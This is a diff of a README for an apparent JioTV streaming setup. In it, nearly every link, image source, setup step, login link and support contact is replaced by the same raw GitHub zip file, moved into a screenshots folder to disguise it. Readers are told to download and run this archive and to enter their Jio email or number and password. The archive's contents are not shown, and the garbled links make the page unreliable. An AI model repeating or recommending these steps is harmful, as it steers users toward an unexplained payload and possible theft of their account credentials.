@@ -1,4 +1,4 @@
-<h1 align='center'>✯ JɪᴏTV <img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="40" height="40"> Pʟᴀʏ 4.0 ✯</h1>
+<h1 align='center'>✯ JɪᴏTV <img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip" width="40" height="40"> Pʟᴀʏ 4.0 ✯</h1>
 
 <!-- DO NOT EDIT FILE AND ADD YOU NAME HERE AND PUBLISH -->
 <!-- © 2021-22 Kirodewal -->
@@ -37,11 +37,11 @@ e.g.  Hindi,Tamil,Kannada,Odia ...
 
 <h2>📸 SCREENSHOTS : </h2>
 
-<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="400" height="200">
+<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip" width="400" height="200">
 
 <br>
 
-<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="400" height="200">
+<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip" width="400" height="200">
 
 <br>
 
@@ -54,28 +54,28 @@ e.g.  Hindi,Tamil,Kannada,Odia ...
 - KSWEB PRO ( Php Web Server ) <br>
 
 ```py
-https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip%https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip
+https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip%https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip
 ```
 
 ```py
-https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip
+https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip
 ```
 
 ```py
-https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip[https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip].apk
+https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip[https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip].apk
 ```
 
 2.  Then Download This Zip Files<br>
 
-- [JioTV Zip](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip) <br>
+- [JioTV Zip](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip) <br>
 
 1. Locate & Extract all Files in LocalHost (Htdocs) Root Folder <br>
 2. Open KSWEB App & Start The Server <br>
-3. Run https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip file for a first time <br>
+3. Run https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip file for a first time <br>
 4. Put Your E-Mail or Mobile Number without +91 & Password in below Link <br>
 
 ```py
-https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip
+https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip
 ```
 7. Now Open [JIOTV WEB] Below Link :
 
@@ -90,7 +90,7 @@ http://localhost:8080/
 
 • Method 2 see here :
 ```py
-https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip
+https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip
 ```
 
 
@@ -100,43 +100,43 @@ https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip
 
 <h2>📸 NEW THEMES SCREENSHOTS : </h2>
 
-##### ♢♢ JIOTV ARCADE SHOTS [CLICK HERE](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip)
+##### ♢♢ JIOTV ARCADE SHOTS [CLICK HERE](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip)
 
-<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="400" height="200">
-
-<br><br>
-
-##### ♢♢ JIOTV CLASSIC SHOTS [CLICK HERE](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip)
-
-<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="400" height="200">
+<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip" width="400" height="200">
 
 <br><br>
 
-##### ♢♢ JIOTV LIGHTMODE SHOTS [CLICK HERE](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip /JioTV/tree/main/screenshots/jiotv-lightmode)
+##### ♢♢ JIOTV CLASSIC SHOTS [CLICK HERE](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip)
 
-<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="400" height="200">
-
-<br><br>
-
-##### ♢♢ JIOTV DARKMODE SHOTS [CLICK HERE](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip)
-
-<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="400" height="200">
+<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip" width="400" height="200">
 
 <br><br>
 
-##### ♢♢ JIOTV PREMIUM SHOTS [CLICK HERE](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip)
+##### ♢♢ JIOTV LIGHTMODE SHOTS [CLICK HERE](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip /JioTV/tree/main/screenshots/jiotv-lightmode)
 
-<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="400" height="200">
+<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip" width="400" height="200">
+
+<br><br>
+
+##### ♢♢ JIOTV DARKMODE SHOTS [CLICK HERE](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip)
+
+<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip" width="400" height="200">
+
+<br><br>
+
+##### ♢♢ JIOTV PREMIUM SHOTS [CLICK HERE](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip)
+
+<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip" width="400" height="200">
 
 <br>
 
-<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="400" height="200">
+<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip" width="400" height="200">
 
 <br><br>
 
 #### 😛 Generate ssoToken Here (HERE YOU GET DATA WITH OTP):
 
-1. ✍️ FOR SSO TOKEN : [JioLogin](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip)<br>
+1. ✍️ FOR SSO TOKEN : [JioLogin](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip)<br>
 2. For This You Need JioID Number and Password<br> 
 3. You Can Also get Data with OTP
 
@@ -152,8 +152,8 @@ https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip
 
 <h3>🤗 Meet Me : </h3>
 
-• For any Support Join Our Group [HxBots](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip)<br>
-• For Any Query Contact at [kirodewal](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip)
+• For any Support Join Our Group [HxBots](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip)<br>
+• For Any Query Contact at [kirodewal](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/screenshots/jiotv-darkmode/TV-Jio-v2.6.zip)
 
 <br>
 
